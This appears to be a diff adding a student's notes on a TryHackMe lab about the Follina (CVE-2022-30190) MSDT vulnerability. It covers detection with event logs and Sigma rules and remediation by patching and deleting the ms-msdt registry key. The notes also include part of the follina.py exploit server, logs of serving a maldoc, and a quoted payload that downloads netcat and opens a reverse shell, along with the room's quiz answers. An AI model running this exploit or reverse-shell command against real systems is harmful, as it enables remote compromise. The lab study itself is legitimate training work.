@@ -274,3 +274,280 @@ def main(args):
     with open(os.path.join(serve_path, "index.html"), "w") as filp:
         filp.write(html_payload)
 
+    class ReuseTCPServer(socketserver.TCPServer):
+        def server_bind(self):
+            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            self.socket.bind(self.server_address)
+
+    class Handler(http.server.SimpleHTTPRequestHandler):
+        def __init__(self, *args, **kwargs):
+            super().__init__(*args, directory=serve_path, **kwargs)
+
+        def log_message(self, format, *func_args):
+            if args.reverse:
+                return
+            else:
+                super().log_message(format, *func_args)
+
+        def log_request(self, format, *func_args):
+            if args.reverse:
+                return
+            else:
+                super().log_request(format, *func_args)
+
+    def serve_http():
+        with ReuseTCPServer(("", args.port), Handler) as httpd:
+            httpd.serve_forever()
+```
+```text
+# Host the HTTP server on all interfaces
+    print(f"[+] serving html payload on :{args.port}")
+    if args.reverse:
+        t = threading.Thread(target=serve_http, args=())
+        t.start()
+        print(f"[+] starting 'nc -lvnp {args.reverse}' ")
+        os.system(f"nc -lnvp {args.reverse}")
+
+    else:
+        serve_http()
+
+if __name__ == "__main__":
+
+    main(parser.parse_args())
+root@ip-10-10-1-188:~/Rooms/Follina-MSDT# cd doc/
+root@ip-10-10-1-188:~/Rooms/Follina-MSDT/doc# ls
+'[Content_Types].xml'   docProps   _rels   word
+root@ip-10-10-1-188:~/Rooms/Follina-MSDT/doc# cat '[Content_Types].xml' 
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/><Override PartName="/word/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml"/><Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/><Override PartName="/word/webSettings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.webSettings+xml"/><Override PartName="/word/fontTable.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.fontTable+xml"/><Override PartName="/word/theme/theme1.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+xml"/><Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/><Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/></Types>root@ip-10-10-1-188:~/Rooms/Follina-MSDT/doc# ls
+'[Content_Types].xml'   docProps   _rels   word
+root@ip-10-10-1-188:~/Rooms/Follina-MSDT/doc# cd word/
+root@ip-10-10-1-188:~/Rooms/Follina-MSDT/doc/word# ls
+document.xml   _rels         styles.xml  webSettings.xml
+fontTable.xml  settings.xml  theme
+root@ip-10-10-1-188:~/Rooms/Follina-MSDT/doc/word# cat webSettings.xml 
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:webSettings xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml" xmlns:w16cex="http://schemas.microsoft.com/office/word/2018/wordml/cex" xmlns:w16cid="http://schemas.microsoft.com/office/word/2016/wordml/cid" xmlns:w16="http://schemas.microsoft.com/office/word/2018/wordml" xmlns:w16se="http://schemas.microsoft.com/office/word/2015/wordml/symex" mc:Ignorable="w14 w15 w16se w16cid w16 w16cex"><w:optimizeForBrowser/><w:allowPNG/></w:webSettings>root@ip-10-10-1-188:~/Rooms/Follina-MSDT/doc/word#
+```
+```text
+using attackbox later on my machine
+
+root@ip-10-10-1-188:~/Rooms/Follina-MSDT# python3.9 follina.py 
+[+] copied staging doc /tmp/lex0kznd
+[+] created maldoc ./follina.doc
+[+] serving html payload on :8000
+
+root@ip-10-10-1-188:~/Rooms/Follina-MSDT# python -m http.server 3456
+Serving HTTP on 0.0.0.0 port 3456 (http://0.0.0.0:3456/) ...
+10.10.198.117 - - [29/Oct/2022 00:27:16] "GET /follina.doc HTTP/1.1" 200 -
+
+Microsoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator>cd Desktop
+
+C:\Users\Administrator\Desktop>curl http://10.10.1.188:3456/follina.doc -o follina.docx
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 10694  100 10694    0     0  10694      0  0:00:01 --:--:--  0:00:01  652k
+
+after clicking follina word
+
+root@ip-10-10-1-188:~/Rooms/Follina-MSDT# python3.9 follina.py 
+[+] copied staging doc /tmp/lex0kznd
+[+] created maldoc ./follina.doc
+[+] serving html payload on :8000
+10.10.198.117 - - [29/Oct/2022 00:31:03] code 501, message Unsupported method ('OPTIONS')
+10.10.198.117 - - [29/Oct/2022 00:31:03] "OPTIONS / HTTP/1.1" 501 -
+10.10.198.117 - - [29/Oct/2022 00:31:04] "HEAD /index.html HTTP/1.1" 200 -
+10.10.198.117 - - [29/Oct/2022 00:31:04] code 501, message Unsupported method ('OPTIONS')
+10.10.198.117 - - [29/Oct/2022 00:31:04] "OPTIONS / HTTP/1.1" 501 -
+10.10.198.117 - - [29/Oct/2022 00:31:04] "GET /index.html HTTP/1.1" 200 -
+10.10.198.117 - - [29/Oct/2022 00:31:04] "HEAD /index.html HTTP/1.1" 200 -
+10.10.198.117 - - [29/Oct/2022 00:31:04] "HEAD /index.html HTTP/1.1" 200 -
+10.10.198.117 - - [29/Oct/2022 00:31:04] code 501, message Unsupported method ('OPTIONS')
+10.10.198.117 - - [29/Oct/2022 00:31:04] "OPTIONS / HTTP/1.1" 501 -
+10.10.198.117 - - [29/Oct/2022 00:31:04] "HEAD /index.html HTTP/1.1" 200 -
+10.10.198.117 - - [29/Oct/2022 00:31:04] code 501, message Unsupported method ('OPTIONS')
+10.10.198.117 - - [29/Oct/2022 00:31:04] "OPTIONS / HTTP/1.1" 501 -
+10.10.198.117 - - [29/Oct/2022 00:31:04] "GET /index.html HTTP/1.1" 304 -
+10.10.198.117 - - [29/Oct/2022 00:31:04] "HEAD /index.html HTTP/1.1" 200 -
+10.10.198.117 - - [29/Oct/2022 00:31:04] "HEAD /index.html HTTP/1.1" 200 -
+10.10.198.117 - - [29/Oct/2022 00:32:32] "HEAD /index.html HTTP/1.1" 200 -
+```
+![[Pasted image 20221028183144.png]]
+“Zero Click” Implementation
+In order to replicate the “zero click” implementation of this vulnerability, we simply head to the malicious word file, add a cute message (completely optional), save it in the Rich Text Format (RTF), and we’re good to go. This implementation assumes that the victim machine is in the preview pane view, else it will revert to the original functionality which will still run upon opening of the file.
+![](https://miro.medium.com/max/720/1*36G5s5CRs_0g_xPiIU8VFw.png)
+![](https://miro.medium.com/max/720/1*ZB4BIKkAfesDD9PwJpa9Vw.png)
+![](https://miro.medium.com/max/720/1*XGCtrjSYp-9MpM2CIR1JiQ.png)
+![](https://miro.medium.com/max/720/1*tujydyxQTfYxkZzx2qn6iw.png)
+And the calculator got spawned even without opening the maldoc! 😱
+What application got executed upon opening of the maldoc that signified compromise? Answer format is "<app>.exe"
+*win32calc.exe*
+What is the filename of the .docx file that has been discovered in the wild? Write it exactly as you see it.
+Fun fact: The last part of the filename is actually the area code of Follina, Italy which is where this vulnerability got it's name from.
+External Research Required
+![[Pasted image 20221028185635.png]]
+https://www.virustotal.com/gui/file/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784/details
+*05-2022-0438.doc*
+The PoC that we used has the capability to establish a reverse shell upon exploit - what binary is being used to accomplish this?
+Check the follina.py file
+```text
+command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
+```
+*netcat*
+Where is this binary being downloaded?
+*C:\\Windows\\Tasks*
+In the original exploit execution, two parent processes are of interest in the list of running processes in Process Explorer, one of them is WINWORD.EXE. Can you find the other one?
+Pay attention to own processes (purple highlight). Close everything and check process explorer again. Re-run the maldoc and check process explorer again.
+![[Pasted image 20221028190150.png]]
+*sdiagnhost.exe*
+What is the child process of WINWORD.EXE?
+![[Pasted image 20221028190226.png]]
+*msdt.exe*
+What is the child process of the other interesting parent process?
+![[Pasted image 20221028190351.png]]
+*conhost.exe*
+What process would be the most obvious piece of evidence to conclude that the "Zero Click" implementation of the exploit was used?
+Close everything and check process explorer again. Re-run the maldoc and check process explorer again. ;) hehe
+![](https://miro.medium.com/max/1400/1*vk8xVWRL5hY6cLHo5h6Emg.png)
+*prevhost.exe*
+### Detection
+Threat hunting
+﻿The Windows machine that we’ve used to study the exploitation of the vulnerability has been pre-configured to have logging enabled for:
+Audit Process Creation
+Command Line Process Auditing, and
+Script Block Logging
+These auditing mechanisms are not configured by default and as such, it is imperative that these are turned on in your own environments to aid in the detection of suspicious behavior, and to help keep valuable data available for forensic examiners.
+During the previous task, we've identified a number of interesting process creations upon the exploitation of the vulnerability. These process creations are logged in Windows Security Logs, ready to be analyzed via your favorite viewer, or forwarded to a centralized log collector to be processed then further used later on.
+For this task we'll be using [Event Log Viewer for Windows](http://www.nirsoft.net/utils/full_event_log_view.html) by Nirsoft to check out the process creations we've identified earlier. We will then look for details within these process creations that we can use to look for clues in other event logs to explain better what happened behind the scenes. The Event Log Viewer has been pinned in the Taskbar for you.
+Proceed to open FullEventLogView pinned in your taskbar. Go to View > Use Quick Filter. A search bar should appear on top of the logs which would allow us to do quick searches. Since we wanted to check the details of our process creations, we can click on the left-most drop down menu and choose Find Event ID (space/comma...), then type 4688 to the search bar provided as shown below:
+The screen should populate with Process Creation events and you'll notice immediately  that there's a ton of them, despite having minimal interaction with the machine.
+The first artifact we'll check is winword.exe - understanding the flow of events from this process gives us an idea how an office process in general, will behave in the context of an msdt exploitation. Hit Ctrl+F to spawn a Find function and type in winword.
+The first entry that you'll probably see is the one where WINWORD.EXE is the new process being created, identified by the detail: New Process Name. This process marks the opening of the follina.docx file, via by the detail: Process Command Line. It should look like the one below, though it's completely normal for it not to look exactly the same.
+Click the Find Next button until you find an entry that looks something like this:
+Here we'll see that the WINWORD.EXE is the Creator Process, more commonly known as the Parent Process of msdt.exe. Notice the long command line entry that contains multiple PowerShell cmdlets (pronounced command-lets) as well as multiple directory traversals. Seeing this, on its own, in your environment should raise immediate red flags. One free nugget that we can look closely here is the string Y2FsYw== that when decoded would result in the string calc.
+Since we saw PowerShell cmdlets, it would make sense for us to filter out PowerShell events to further check this lead. Since there's a lot of unique event IDs that log PowerShell events, we can filter via Provider. Go to Options > Advanced Options. Click the second dropdown menu and select Show only the specific providers (comma-delimited...). Type PowerShell enclosed with wildcards (*) so all providers with regards to PowerShell will be included.
+![[Pasted image 20221028192648.png]]
+Clear the "Quick Filter" box of the 4688 we entered earlier, and the screen should populate with events that exclusively come from PowerShell providers. From here, we can filter the events via part of the PowerShell command we've noted above.
+![[Pasted image 20221028193003.png]]
+Upon arriving in this event, we can close the find function and then proceed to follow the trail of this Scriptblock text; you can navigate to the next event by pressing the down key in your keyboard, or manually clicking the event. Exploring the immediate events that follow this scriptblock text will show the step-by-step execution of calc in the perspective of PowerShell.
+There's still a lot to be explored in the above scriptblock alone but for the sake of brevity, it will be left to the student to explore further and see what else they can uncover. Questions at the end of this task may serve as guide as well.
+Sigma rule availability https://gist.github.com/matthewB-huntress/14ab9d309f25a05fc9305a8e7f351089
+Huntress Detection Engineer Matthew Brennan has created a sigma rule to detect suspicious MSDT executions in the environment and the best thing about it is that it keeps getting updated whenever the community spots something new.
+The sigma rule can be found here.
+[Uncoder.IO](https://uncoder.io/) is a nice tool that helps convert sigma rules to queries that can be immediately used within a SIEM of your choice.
+Security Information and Event Management system that is used to aggregate security information in the form of logs, alerts, artifacts and events into a centralized platform that would allow security analysts to perform near real-time analysis during security monitoring.
+In hunting for MSDT exploits around the environment, you may opt to use the sigma rule as a detection mechanism for both:
+Analytics for use in near real time detections of exploits, and
+Retroactive checks of prior intrusions
+MSDT also uses another [binary](https://twitter.com/KyleHanslovan/status/1531114931973767168) to channel executions and so, suspicious child processes with it as the parent should be noted and further investigated. The "redacted" information above is an answer to a question in the previous task - check at your own spoilage.
+Further reading:
+Detecting Follina: Microsoft Office remote code execution zero-day https://www.logpoint.com/en/blog/detecting-follina-microsoft-office-remote-code-execution-zero-day/
+Antivirus / Windows Defender
+A number of Microsoft Defender products have detection mechanisms in place and our trusty Microsoft Security Response Center provides us a list of those
+https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/
+![[Pasted image 20221028193355.png]]
+What encoding is used in the string Y2FsYw==
+*base64*
+What is the parent process of calc.exe?
+*sdiagnhost.exe*
+![[Pasted image 20221028194459.png]]
+Diagnostic package index information is loaded from what file path?
+https://answers.microsoft.com/en-us/windows/forum/all/cwindowsdiagnosticsindexdevicediagnosticxml/2a6039d8-90b5-48e7-9df0-556d6ecbeb4f
+![[Pasted image 20221028194830.png]]
+*C:\Windows\diagnostics\index*
+### Remediation
+The patch for this vulnerability is in the June 2022 cumulative [Windows Updates](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-30190). It is imperative that users install these updates to be protected from the vulnerability.
+You can either do this manually every so often, which isn’t very efficient and prone to be forgotten, or you can opt to automate checking and installation of updates. Nowadays it’s as easy as typing “updates” in the search bar and it will immediately bring you to the updates section of the computer’s settings.
+Disable MSDT URL Protocol
+Before the patch has been introduced, security teams scrambled their organization’s IT Administrators to immediately disable the MSDT URL Protocol. By disabling the MSDT URL Protocol, troubleshooters will not be launched as links and so ms-msdt won’t be able to be called by Office.
+To disable the protocol, first run a command prompt as administrator (for our VM, it's automatically ran as administrator).
+```text
+ms-msdt url backup and deletion
+
+           
+Microsoft Windows [Version]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator> cd Desktop
+C:\Users\Administrator\Desktop> reg query HKEY_CLASSES_ROOT\ms-msdt
+
+HKEY_CLASSES_ROOT\ms-msdt
+          [...]
+
+HKEY_CLASSES_ROOT\ms-msdt\shell
+
+C:\Users\Administrator\Desktop> reg export HKEY_CLASSES_ROOT\ms-msdt ms-msdt_backup
+The operation completed successfully.
+
+C:\Users\Administrator\Desktop> reg delete HKEY_CLASSES_ROOT\ms-msdt /f
+The operation completed successfully.
+
+C:\Users\Administrator\Desktop> reg query HKEY_CLASSES_ROOT\ms-msdt
+ERROR: The system was unable to find the specified registry key or value.
+```
+By now, you must have noticed that we're always changing our working directory to the Desktop - it's so we can immediately see the changes that our commands are introducing to the environment: file creation is fairly noticeable. It is by no means, however, the best practice to do in any environment.
+The first reg query command that we've introduced is a quick check that the key exists. It is followed by reg export that exports our key into a file so we may be able to reintegrate it in our system later on when Microsoft comes up with a more permanent fix to this vulnerability. The exported file is saved in the current working directory - in our case the Desktop.
+The reg delete command is the command that actually disables the MSDT URL Protocol mainly because it essentially removes it altogether from the system. The final reg query command is a confirmatory check that the key no longer exists.
+Upon disabling the MSDT URL Protocol in our Windows machine, let's try to trigger the exploit again, and see how it impacts the machine. This is a good way to check if our controls would be able to catch attacks, regardless if they're successful or not.
+Attack Surface Reduction (ASR)
+If you’re using Microsoft Defender for Endpoint in your environment, enable the ASR rule Block all Office applications from creating child. Creating child processes from services that should not have been doing that is a common theme among malwares.
+Further Reading: Guidance for CVE-2022-30190 Microsoft Support Diagnostic Tool Vulnerability – Microsoft Security Response Center
+https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/
+What error message did the document give upon opening?
+That error that you've just noticed, had you not known that we're doing an experiment here, is called an Indicator of Attack. You must be very cautious of these kinds of error messages in your own environments.
+![](https://miro.medium.com/max/720/1*G9RyCJGNr_FJr9RC12g2gQ.png)
+```text
+Microsoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator>cd Desktop
+
+C:\Users\Administrator\Desktop>reg query HKEY_CLASSES_ROOT\ms-msdt
+
+HKEY_CLASSES_ROOT\ms-msdt
+    (Default)    REG_SZ    URL:ms-msdt
+    EditFlags    REG_DWORD    0x200000
+    URL Protocol    REG_SZ
+
+HKEY_CLASSES_ROOT\ms-msdt\shell
+
+C:\Users\Administrator\Desktop>reg export HKEY_CLASSES_ROOT\ms-msdt ms-msdt_backup
+The operation completed successfully.
+
+C:\Users\Administrator\Desktop>reg delete HKEY_CLASSES_ROOT\ms-msdt /f
+The operation completed successfully.
+
+C:\Users\Administrator\Desktop>reg query HKEY_CLASSES_ROOT\ms-msdt
+ERROR: The system was unable to find the specified registry key or value.
+```
+![[Pasted image 20221028195855.png]]
+*You'll need a new app to open this ms-msdt*
+https://www.youtube.com/watch?v=dGCOhORNKRk
+### Room Recap + Recent Developments
+This room explored the MSDT Service and its vulnerability history. It touched upon the idea that features, no matter the intended purpose, will be abused sooner or later. There is no shortage of creativity in this industry, and every so often, exploitation of vulnerabilities such as this is being discovered in the wild.
+This room has also emphasized the importance of establishing a proper baseline and consequently explored threat hunting techniques that are transferrable in most environments through the use of simple tools that can easily be downloaded and deployed. This is closely followed by a threat hunting challenge that can be solved by following said techniques.
+Finally, a couple of remediation processes that are both straightforward and easily deployable has been the chosen method of closing this topic
+https://www.bleepingcomputer.com/news/security/microsoft-patches-actively-exploited-follina-windows-zero-day/
+As of room publishing, Microsoft has already released a patch that blocks PowerShell injection, effectively disabling that attack vector.
+This room will be updated from time to time.
+See you again soon, and happy hunting!
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/7a1c3347258d011c7a5eae7ead9e4113.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/1ed510ea7ae885e8d03d457a0f4f07ed.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/7c3e1e5de237a497ee277f8490efc967.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/c88e19f2ecbbac119deabd3377309580.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/d1702225acb5cfc44ab029192a455ca4.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/f805b0a62927fff054b878a295605e80.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/0aa4ce4c1527a9d1b160302e7a186d8d.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/bab2ae3b9ce95e9af6db64e617b35dad.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/671f03a57359033de387b25a1d087300.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/bb40ec87492639e3e808b7a38b5e586c.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/384b4ff19504919caa6646c149a0c686.png)
+
+## Notes / Lessons Learned
+[[Keldagrim]]
+
